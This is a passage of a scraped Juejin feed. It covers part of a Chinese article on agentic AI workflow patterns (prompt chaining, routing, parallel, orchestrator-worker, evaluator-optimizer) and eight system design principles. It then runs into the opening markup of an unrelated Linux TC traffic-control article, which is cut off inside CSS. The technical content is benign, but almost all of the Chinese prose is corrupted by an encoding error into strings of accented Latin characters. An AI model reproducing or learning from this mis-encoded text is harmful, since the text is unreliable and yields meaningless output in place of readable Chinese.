<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d86bd1f280f2430e83eda0d83d7d19f6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRnJlZUNvZGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444812&amp;x-signature=VVXSTk3CAPJCeKmj3ej2tAUJVeU%3D" alt="image.png" loading="lazy"/></p>
<p><strong>æ ¸å¿ƒä¼˜åŠ¿</strong>ï¼š</p>
<ul>
<li>é«˜æ•ˆå¤„ç†å¤§è§„æ¨¡åˆ†å¸ƒå¼é—®é¢˜ã€‚</li>
<li>æ•´åˆå„æ™ºèƒ½ä½“çš„ä¸“ä¸šåŒ–èƒ½åŠ›ï¼Œè¾¾æˆæ›´ä¼˜ä»»åŠ¡æˆæ•ˆã€‚</li>
</ul>
<p><strong>åº”ç”¨ç¤ºä¾‹</strong>ï¼š</p>
<ul>
<li>åœ¨å®¢æœåœºæ™¯ä¸­ï¼Œå¤šä¸ªæ™ºèƒ½ä½“ååŒå·¥ä½œ â€”â€” æœ‰çš„ä»å¸¸è§é—®é¢˜è§£ç­”åº“ï¼ˆFAQsï¼‰ä¸­æ£€ç´¢çŸ¥è¯†ï¼Œæœ‰çš„ç”Ÿæˆå›å¤å†…å®¹ï¼Œæœ‰çš„è·Ÿè¿›ç”¨æˆ·åç»­éœ€æ±‚ã€‚</li>
<li>æ³•å¾‹æ™ºèƒ½è¾…åŠ©ç³»ç»Ÿ LawGlance å€ŸåŠ©å¤šæ™ºèƒ½ä½“å·¥ä½œæµç®€åŒ–æ³•å¾‹ç ”ç©¶æµç¨‹ï¼šæ™ºèƒ½ä½“åˆ†å·¥å®Œæˆç›¸å…³æ³•å¾‹æ–‡æ¡£æ£€ç´¢ã€ä¿¡æ¯åˆ†æï¼Œå¹¶è¾“å‡ºç²¾å‡†çš„æ³•å¾‹æ´è§ã€‚è¯¥ç³»ç»Ÿæ•´åˆäº† Crew AIã€LangChain ä¸ Chroma å·¥å…·ï¼Œå®ç°æ³•å¾‹æ–‡æ¡£æ£€ç´¢ã€ç½‘ç»œæœç´¢åŠŸèƒ½ï¼Œå¹¶é’ˆå¯¹ç”¨æˆ·çš„æŸ¥è¯¢éœ€æ±‚ç”Ÿæˆç®€æ´å‡†ç¡®çš„ç­”å¤ã€‚</li>
</ul>
<h2 data-id="heading-5">äºŒã€å·¥ä½œæµåŸºç¡€è®¾è®¡æ¨¡å¼</h2>
<p>å·¥ä½œæµè®¾è®¡æ¨¡å¼ä¸ºå¼€å‘è€…æ„å»ºå‡†ç¡®ã€é«˜æ•ˆã€é«˜æ€§èƒ½çš„å¤§æ¨¡å‹åº”ç”¨æä¾›ä¼˜åŒ–çš„è§£å†³æ–¹æ¡ˆã€‚å…·ä½“é‡‡ç”¨ä½•ç§æ–¹æ¡ˆï¼Œéœ€æ ¹æ®ä»»åŠ¡å¤æ‚åº¦ä¸å¤„ç†éœ€æ±‚è€Œå®šã€‚å·¥ä½œæµæœ‰äº”å¤§åŸºç¡€è®¾è®¡æ¨¡å¼ï¼š</p>
<h3 data-id="heading-6">1ã€æç¤ºé“¾æ¨¡å¼</h3>
<p>æç¤ºé“¾å°†ä¸€é¡¹å¤æ‚ä»»åŠ¡æ‹†è§£ä¸ºå¤šä¸ªæ­¥éª¤ï¼Œæ¯ä¸ªæ­¥éª¤å‡åŸºäºå‰åºæ­¥éª¤çš„ç»“æœæ¨è¿›ã€‚è¿™ç§ç»“æ„åŒ–æ–¹æ³•é€šè¿‡åœ¨æ‰§è¡Œåç»­ç¯èŠ‚å‰ç®€åŒ–æ¯ä¸ªå­ä»»åŠ¡ï¼Œæœ‰æ•ˆæå‡äº†ä»»åŠ¡å¤„ç†çš„å‡†ç¡®æ€§ã€‚ä½†å—é™äºé¡ºåºå¤„ç†æœºåˆ¶ï¼Œè¯¥æ–¹æ³•å¯èƒ½ä¼šå¢åŠ ç³»ç»Ÿå»¶è¿Ÿã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2a4768804f8543ffa07b927995e49e35~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRnJlZUNvZGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444812&amp;x-signature=8rlw9m5lF5nJFBSedaFan3Z7HK4%3D" alt="image.png" loading="lazy"/></p>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼š</p>
<p>å½“æŸé¡¹ä»»åŠ¡å¯è¢«æ‹†è§£ä¸ºè‹¥å¹²å›ºå®šå­ä»»åŠ¡ï¼Œä¸”æ¯ä¸ªå­ä»»åŠ¡å‡å¯¹æœ€ç»ˆè¾“å‡ºç»“æœæœ‰æ‰€è´¡çŒ®æ—¶ï¼Œè¯¥å·¥ä½œæµçš„æ•ˆç”¨å¯å¾—åˆ°æœ€å¤§å‘æŒ¥ã€‚æ­¤æ–¹æ³•åœ¨éœ€è¦é€šè¿‡é€æ­¥æ¨ç†æå‡å‡†ç¡®æ€§çš„åœºæ™¯ä¸­å°¤ä¸ºå®ç”¨ã€‚</p>
<p><strong>åº”ç”¨ç¤ºä¾‹</strong>ï¼š</p>
<ul>
<li>å…ˆä»¥æŸä¸€ç§è¯­è¨€åˆ›ä½œè¥é”€å†…å®¹ï¼Œå†åœ¨ä¿ç•™å…¶è¯­è¨€ç²¾é«“çš„å‰æä¸‹å°†å…¶ç¿»è¯‘ä¸ºå¦ä¸€ç§è¯­è¨€ã€‚</li>
<li>æŒ‰ç»“æ„åŒ–æµç¨‹æ’°å†™æ–‡æ¡£ï¼šå…ˆç”Ÿæˆæ–‡æ¡£å¤§çº²ï¼Œæ ¸éªŒå¤§çº²çš„å®Œæ•´æ€§ï¼Œå†æ®æ­¤æ’°å†™å®Œæ•´æ–‡æœ¬ã€‚</li>
</ul>
<h3 data-id="heading-7">2ã€è·¯ç”±æ¨¡å¼</h3>
<p>è·¯ç”±æ¨¡å¼çš„æ ¸å¿ƒæ˜¯å¯¹è¾“å…¥å†…å®¹è¿›è¡Œåˆ†ç±»ï¼Œå¹¶å°†å…¶å¯¼å‘å¯¹åº”çš„ä¸“ç”¨æç¤ºè¯æˆ–å¤„ç†æµç¨‹ã€‚è¿™ç§æ–¹æ³•ç¡®ä¿ä¸åŒç±»å‹çš„æŸ¥è¯¢æˆ–ä»»åŠ¡è¢«åˆ†ç±»å¤„ç†ï¼Œä»è€Œæå‡å¤„ç†æ•ˆç‡ä¸å“åº”è´¨é‡ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f5f668643b5645608ec74ac9a9392cea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRnJlZUNvZGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444812&amp;x-signature=kDK13HE4V0q5YFMy72Bo5QSJnDA%3D" alt="image.png" loading="lazy"/></p>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼š</p>
<p>é€‚ç”¨äºä¸åŒç±»å‹è¾“å…¥éœ€è¦å·®å¼‚åŒ–å¤„ç†ç­–ç•¥çš„åœºæ™¯ï¼Œå¯ç¡®ä¿å„ç±»ä»»åŠ¡çš„å¤„ç†æ€§èƒ½è¾¾åˆ°æœ€ä¼˜ã€‚</p>
<p><strong>åº”ç”¨ç¤ºä¾‹</strong>ï¼š</p>
<ul>
<li>å°†å®¢æˆ·æœåŠ¡å’¨è¯¢åˆ†ç±»è‡³ä¸åŒæ¿å—ï¼Œå¦‚æŠ€æœ¯æ”¯æŒã€é€€æ¬¾ç”³è¯·æˆ–é€šç”¨å’¨è¯¢ã€‚</li>
<li>ä¸ºæ§åˆ¶æˆæœ¬ï¼Œå°†ç®€å•æŸ¥è¯¢åˆ†é…ç»™è½»é‡çº§æ¨¡å‹å¤„ç†ï¼Œå¤æ‚è¯·æ±‚åˆ™äº¤ç”±å…ˆè¿›æ¨¡å‹è´Ÿè´£ã€‚</li>
</ul>
<h3 data-id="heading-8">3ã€å¹¶è¡Œæ¨¡å¼</h3>
<p>å¹¶è¡Œæ¨¡å¼å°†ä¸€é¡¹ä»»åŠ¡æ‹†è§£ä¸ºå¤šä¸ªå¯åŒæ­¥è¿è¡Œçš„ç‹¬ç«‹å­æµç¨‹ï¼Œä»¥æ­¤é™ä½ç³»ç»Ÿå»¶è¿Ÿã€æé«˜ååé‡ã€‚è¯¥æ¨¡å¼å¯åˆ†ä¸ºä¸¤ç±»ï¼šåˆ†æ®µæ‰§è¡Œï¼ˆé¢å‘ç›¸äº’ç‹¬ç«‹çš„å­ä»»åŠ¡ï¼‰ä¸æŠ•ç¥¨æœºåˆ¶ï¼ˆé€šè¿‡å¤šä»½è¾“å‡ºç»“æœæå‡å‡†ç¡®æ€§ï¼‰ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a81efc1b7a044c609e32c79110e05337~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRnJlZUNvZGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444812&amp;x-signature=5kl1t9ZOEAhJvMxRy8KpRhuBk7E%3D" alt="image.png" loading="lazy"/></p>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼š</p>
<p>é€‚ç”¨äºä»»åŠ¡å¯æ‹†è§£ä¸ºç‹¬ç«‹æ¨¡å—ä»¥æå‡å¤„ç†é€Ÿåº¦ï¼Œæˆ–éœ€è¦é€šè¿‡å¤šä»½è¾“å‡ºç»“æœå¢å¼ºç»“è®ºå¯ä¿¡åº¦çš„åœºæ™¯ã€‚</p>
<p><strong>åº”ç”¨ç¤ºä¾‹</strong>ï¼š</p>
<ul>
<li>åˆ†æ®µæ‰§è¡Œï¼šæ‹†åˆ†å†…å®¹å®¡æ ¸ç±»ä»»åŠ¡ï¼Œç”±ä¸€ä¸ªæ¨¡å‹è´Ÿè´£è¾“å…¥å†…å®¹ç­›æŸ¥ï¼ŒåŒæ—¶ç”±å¦ä¸€ä¸ªæ¨¡å‹åŒæ­¥ç”Ÿæˆåé¦ˆç»“æœã€‚</li>
<li>æŠ•ç¥¨æœºåˆ¶ï¼šéƒ¨ç½²å¤šä¸ªæ¨¡å‹äº¤å‰æ ¡éªŒä»£ç æ¼æ´ï¼Œæˆ–å¯¹å†…å®¹å®¡æ ¸ç»“è®ºè¿›è¡Œå¤šæ¨¡å‹ä¸€è‡´æ€§åˆ†æã€‚</li>
</ul>
<h3 data-id="heading-9">4ã€åè°ƒå™¨ - æ‰§è¡Œè€…æ¨¡å¼</h3>
<p>è¯¥è®¾è®¡æ¨¡å¼çš„æ ¸å¿ƒç‰¹å¾æ˜¯ä¸€ä¸ªä¸­å¤®åè°ƒå™¨æ¨¡å‹â€”â€” å®ƒå¯åŠ¨æ€å°†ä»»åŠ¡æ‹†è§£ä¸ºå­ä»»åŠ¡ï¼Œåˆ†é…ç»™ä¸“ä¸šåŒ–çš„æ‰§è¡Œè€…æ¨¡å‹ï¼Œå¹¶å¯¹æ‰§è¡Œç»“æœè¿›è¡Œæ±‡æ€»æ•´åˆã€‚ä¸å¹¶è¡Œå¤„ç†æ¨¡å¼ä¸åŒï¼Œè¯¥æ¨¡å¼èƒ½æ ¹æ®è¾“å…¥å†…å®¹çš„å¤æ‚ç¨‹åº¦è¿›è¡Œè‡ªé€‚åº”è°ƒæ•´ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/afaf54dc1cf64779b686be1664ef6ffb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRnJlZUNvZGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444812&amp;x-signature=JyQ2ldude9anX1LTLvf5lBcIRgI%3D" alt="image.png" loading="lazy"/></p>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼š</p>
<p>æœ€é€‚åˆéœ€è¦åŠ¨æ€ä»»åŠ¡åˆ†è§£ä¸å®æ—¶è‡ªé€‚åº”è°ƒæ•´ï¼Œä¸”å­ä»»åŠ¡æ— æ³•é¢„å…ˆå®šä¹‰çš„åœºæ™¯ã€‚</p>
<p><strong>åº”ç”¨ç¤ºä¾‹</strong>ï¼š</p>
<ul>
<li>æ ¹æ®éœ€æ±‚å˜æ›´çš„å…·ä½“å†…å®¹ï¼Œè‡ªåŠ¨ä¿®æ”¹ä»£ç åº“ä¸­çš„å¤šä¸ªæ–‡ä»¶ã€‚</li>
<li>ä»å¤šä¸ªä¿¡æ¯æºæ”¶é›†å¹¶æ•´åˆç›¸å…³æ•°æ®ï¼Œå¼€å±•å®æ—¶ç ”ç©¶å·¥ä½œã€‚</li>
</ul>
<h3 data-id="heading-10">5ã€è¯„ä¼°å™¨ - ä¼˜åŒ–å™¨æ¨¡å¼</h3>
<p>è¯„ä¼°å™¨ - ä¼˜åŒ–å™¨æ¨¡å¼çš„è¿è¡Œé€»è¾‘æ˜¯ï¼šå…ˆç”Ÿæˆåˆå§‹è¾“å‡ºå†…å®¹ï¼Œå†åŸºäºè¯„ä¼°æ¨¡å‹çš„åé¦ˆä¿¡æ¯å¯¹å…¶è¿›è¡Œè¿­ä»£ä¼˜åŒ–ï¼Œä»è€ŒæŒç»­æ”¹è¿›å†…å®¹è´¨é‡ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0edf7a8c10f34bf7b65ddc382f37252e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRnJlZUNvZGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444812&amp;x-signature=xVHQ2P1jsvtVP73FH4Px5eIR6Es%3D" alt="image.png" loading="lazy"/></p>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼š</p>
<p>é€‚ç”¨äºé€šè¿‡è¿­ä»£ä¼˜åŒ–èƒ½æ˜¾è‘—æå‡å“åº”è´¨é‡çš„ä»»åŠ¡ï¼Œå°¤å…¶åœ¨å­˜åœ¨æ˜ç¡®è¯„ä¼°æ ‡å‡†çš„åœºæ™¯ä¸­æ•ˆæœçªå‡ºã€‚</p>
<p><strong>åº”ç”¨ç¤ºä¾‹</strong>ï¼š</p>
<ul>
<li>é€šè¿‡å¤šè½®è¯„ä¼°ä¸ä¼˜åŒ–å¾ªç¯ï¼Œå®Œå–„æ–‡å­¦æ–‡æœ¬çš„ç¿»è¯‘è´¨é‡ã€‚</li>
<li>æ‰§è¡Œå¤šè½®ç ”ç©¶æ£€ç´¢ä»»åŠ¡ï¼Œé€šè¿‡è¿­ä»£ä¼˜åŒ–æŒç»­ç²¾ç‚¼æœç´¢ç»“æœã€‚</li>
</ul>
<h2 data-id="heading-11">ä¸‰ã€Agentic AIç³»ç»Ÿæ ¸å¿ƒè®¾è®¡åŸåˆ™</h2>
<h3 data-id="heading-12">3.1 æ ¸å¿ƒè®¾è®¡åŸåˆ™</h3>
<p>Agentic AIç³»ç»Ÿè®¾è®¡åº”éµå¾ªä»¥ä¸‹å…«å¤§æ ¸å¿ƒåŸåˆ™ï¼š</p>
<h4 data-id="heading-13">1ã€è‡ªä¸»æ€§ä¸å¯æ§æ€§åŸåˆ™</h4>
<p>å¼€å‘è€…åº”æ ¹æ®å®é™…éœ€æ±‚å†³å®šæ˜¯è®©ç³»ç»Ÿè‡ªä¸»æ€§æ›´å¼ºä¸€äº›è¿˜æ˜¯å·¥ä½œæµç¨‹çš„å¯æ§æ€§æ›´å¼ºä¸€äº›ã€‚</p>
<h4 data-id="heading-14">2ã€æ¨¡å—åŒ–ä¸ç»„ä»¶åŒ–åŸåˆ™</h4>
<p>å°†æ™ºèƒ½ä½“ç³»ç»Ÿæ‹†è§£ä¸ºæ¾è€¦åˆã€å¯å¤ç”¨çš„åŠŸèƒ½æ¨¡å—ï¼Œå„æ¨¡å—ç‹¬ç«‹å°è£…èƒ½åŠ›ï¼Œä¾¿äºçµæ´»ç»„åˆã€å‡çº§ä¸ç»´æŠ¤ã€‚</p>
<h4 data-id="heading-15">3ã€åŠ¨æ€é€‚åº”æ€§åŸåˆ™</h4>
<p>ç³»ç»Ÿéœ€å…·å¤‡åº”å¯¹éç»“æ„åŒ–ã€å®æ—¶å˜åŒ–åœºæ™¯çš„èƒ½åŠ›ï¼Œèƒ½å¤Ÿå¤„ç†è®­ç»ƒæ•°æ®å¤–çš„æ–°é—®é¢˜ã€æ–°è¾“å…¥ï¼Œè§£å†³ä¼ ç»Ÿ LLMâ€œçŸ¥è¯†è¿‡æ—¶ã€è¯­å¢ƒè„±èŠ‚â€ çš„ç—›ç‚¹ã€‚</p>
<h4 data-id="heading-16">4ã€å·¥å…·å¢å¼ºåŸåˆ™</h4>
<p>é€šè¿‡é›†æˆå¤–éƒ¨å·¥å…·ã€çŸ¥è¯†åº“ä¸è®¡ç®—èµ„æºï¼Œçªç ´æ™ºèƒ½ä½“è‡ªèº«é¢„è®­ç»ƒçŸ¥è¯†çš„å±€é™ï¼Œæ‹“å±•ç³»ç»Ÿçš„åŠŸèƒ½è¾¹ç•Œä¸é¢†åŸŸé€‚é…èƒ½åŠ›ã€‚</p>
<h4 data-id="heading-17">5ã€åä½œæ€§åŸåˆ™</h4>
<p>å¯¹äºå¤æ‚åœºæ™¯å¤æ‚ä»»åŠ¡ä¸‹çš„Agentic AIï¼Œé‡‡ç”¨å¤šæ™ºèƒ½ä½“åˆ†å·¥åä½œï¼Œé€šè¿‡ä»»åŠ¡åˆ†é…ã€ä¿¡æ¯å…±äº«ä¸ç»“æœæ•´åˆï¼Œå¯ä»¥å–å¾—å•æ™ºèƒ½ä½“æ— æ³•è¾¾æˆçš„æ•ˆæœã€‚</p>
<h4 data-id="heading-18">6ã€è¿­ä»£ä¼˜åŒ–åŸåˆ™</h4>
<p>å†…ç½®åæ€ä¸åé¦ˆæœºåˆ¶ï¼Œé€šè¿‡ â€œæ‰§è¡Œ - è¯„ä¼° - ä¼˜åŒ–â€ çš„é—­ç¯æµç¨‹ï¼ŒæŒç»­æå‡ä»»åŠ¡æ‰§è¡Œçš„å‡†ç¡®æ€§ä¸æ•ˆç‡ã€‚</p>
<h4 data-id="heading-19">7ã€å¯è§£é‡Šæ€§åŸåˆ™</h4>
<p>æ™ºèƒ½ä½“çš„å†³ç­–è¿‡ç¨‹ä¸è¾“å‡ºç»“æœéœ€é€æ˜å¯è¿½æº¯ï¼Œä¾¿äºç”¨æˆ·ç†è§£ã€è°ƒè¯•ä¸ä¿¡ä»»ï¼Œå°¤å…¶é€‚ç”¨äºåŒ»ç–—ã€æ³•å¾‹ã€é‡‘èç­‰é«˜å±é¢†åŸŸã€‚</p>
<h4 data-id="heading-20">8ã€èµ„æºä¼˜åŒ–ä¸å¯æ‰©å±•æ€§åŸåˆ™</h4>
<p>åœ¨ä¿è¯ç³»ç»Ÿæ€§èƒ½çš„å‰æä¸‹ï¼Œåˆç†åˆ†é…è®¡ç®—èµ„æºï¼Œå¹¶æ”¯æŒéšç€ä»»åŠ¡è§„æ¨¡å¢é•¿å¹³æ»‘æ‰©å±•ï¼Œé¿å…èµ„æºæµªè´¹æˆ–ç³»ç»Ÿå´©æºƒã€‚</p>
<h3 data-id="heading-21">3.2 è®¾è®¡åŸåˆ™ä¹‹é—´çš„ååŒå…³ç³»</h3>
<p>Agentic AIç³»ç»Ÿçš„å…«å¤§æ ¸å¿ƒè®¾è®¡åŸåˆ™å¹¶éå­¤ç«‹å­˜åœ¨ï¼Œè€Œæ˜¯ç›¸äº’æ”¯æ’‘ã€ååŒä½œç”¨ï¼š</p>
<ul>
<li>è‡ªä¸»å¯æ§ + æ¨¡å—åŒ– æ˜¯ç³»ç»Ÿçš„æ ¸å¿ƒæ¶æ„åŸºç¡€ï¼›</li>
<li>åŠ¨æ€é€‚åº”æ€§ + å·¥å…·å¢å¼º æ‹“å±•ç³»ç»Ÿçš„èƒ½åŠ›è¾¹ç•Œï¼›</li>
<li>åä½œæ€§ + è¿­ä»£ä¼˜åŒ– æå‡å¤æ‚ä»»åŠ¡çš„å¤„ç†æ•ˆç‡ä¸è´¨é‡ï¼›</li>
<li>å¯è§£é‡Šæ€§ + èµ„æºä¼˜åŒ– ä¿éšœç³»ç»Ÿçš„å¯é æ€§ä¸å®ç”¨æ€§ã€‚</li>
</ul>
<h2 data-id="heading-22">å››ã€æ€»ç»“</h2>
<ul>
<li>
<p>æ™ºèƒ½ä½“å››å¤§åŸºç¡€è®¾è®¡æ¨¡å¼ï¼šåæ€ã€è§„åˆ’ã€å·¥å…·è°ƒç”¨ã€å¤šæ™ºèƒ½ä½“åä½œã€‚</p>
</li>
<li>
<p>å·¥ä½œæµäº”å¤§åŸºç¡€è®¾è®¡æ¨¡å¼ï¼šæç¤ºé“¾ã€è·¯ç”±ã€å¹¶è¡Œã€åè°ƒå™¨ - æ‰§è¡Œè€…ã€è¯„ä¼°å™¨ - ä¼˜åŒ–å™¨ã€‚</p>
</li>
<li>
<p>æ™ºèƒ½ä½“å’Œå·¥ä½œæµæ„æˆAgentic AIç³»ç»Ÿçš„åŸºç¡€ï¼Œé‚£ä¹ˆæ™ºèƒ½ä½“å’Œå·¥ä½œæµçš„è¿™ä¹ç§è®¾è®¡æ¨¡å¼åˆ™æ„æˆAgentic AIç³»ç»Ÿè®¾è®¡çš„åŸºç¡€ã€‚å¼€å‘è€…å¯ä»¥çµæ´»é€‰æ‹©å’Œç»„åˆå®ƒä»¬æ¥æ„å»ºç¬¦åˆå®é™…åœºæ™¯éœ€è¦çš„æ™ºèƒ½ä½“åŒ–AIç³»ç»Ÿã€‚</p>
</li>
<li>
<p>ç»å…¸çš„æ™ºèƒ½ä½“è®¾è®¡æ¨¡å¼ReActæ¨¡å¼ã€Plan and Executeæ¨¡å¼ã€ä»¥åŠå¤šæ™ºèƒ½ä½“çš„ä¸»ç®¡åˆ†æ´¾æ¨¡å¼ã€å¹³ç­‰äº¤æ¥æ¨¡å¼ï¼Œæœ¬è´¨ä¸Šéƒ½æ˜¯å¯¹è¿™äº›åŸºç¡€è®¾è®¡æ¨¡å¼çš„ç»„åˆè¿ç”¨ã€‚æ‰€ä¸åŒçš„åªæ˜¯åŸºç¡€æ¨¡å¼é’ˆå¯¹å•ä¸€ä»»åŠ¡å’ŒåŸºç¡€åœºæ™¯çš„å¤„ç†æ¨¡å¼æŠ½è±¡ï¼Œç»„åˆæ¨¡å¼æ˜¯é’ˆå¯¹å¤åˆä»»åŠ¡å’Œå¤æ‚åœºæ™¯çš„å¤„ç†æ¨¡å¼æŠ½è±¡ã€‚</p>
</li>
<li>
<p>Agentic AIç³»ç»Ÿè®¾è®¡åº”æ ¹æ®å®é™…éœ€æ±‚ï¼Œéµå¾ªå…«å¤§æ ¸å¿ƒè®¾è®¡åŸåˆ™ï¼Œçµæ´»é€‰æ‹©å’Œç»„åˆä½¿ç”¨åŸºç¡€è®¾è®¡æ¨¡å¼ã€‚</p>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Linuxæµé‡æ§åˆ¶ç¥å™¨TCå®Œå…¨æŒ‡å—ï¼šåŸç†è¯¦è§£ä¸å®è·µæŒ‡å—]]></title>    <link>https://juejin.cn/post/7592548677743935534</link>    <guid>https://juejin.cn/post/7592548677743935534</guid>    <pubDate>2026-01-08T02:31:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592548677743935534" data-draft-id="7592520539152875529" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Linuxæµé‡æ§åˆ¶ç¥å™¨TCå®Œå…¨æŒ‡å—ï¼šåŸç†è¯¦è§£ä¸å®è·µæŒ‡å—"/> <meta itemprop="keywords" content="Linux,å‘½ä»¤è¡Œ"/> <meta itemprop="datePublished" content="2026-01-08T02:31:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AllFiles"/> <meta itemprop="url" content="https://juejin.cn/user/1927880364792937"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Linuxæµé‡æ§åˆ¶ç¥å™¨TCå®Œå…¨æŒ‡å—ï¼šåŸç†è¯¦è§£ä¸å®è·µæŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1927880364792937/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AllFiles
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T02:31:08.000Z" title="Thu Jan 08 2026 02:31:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol 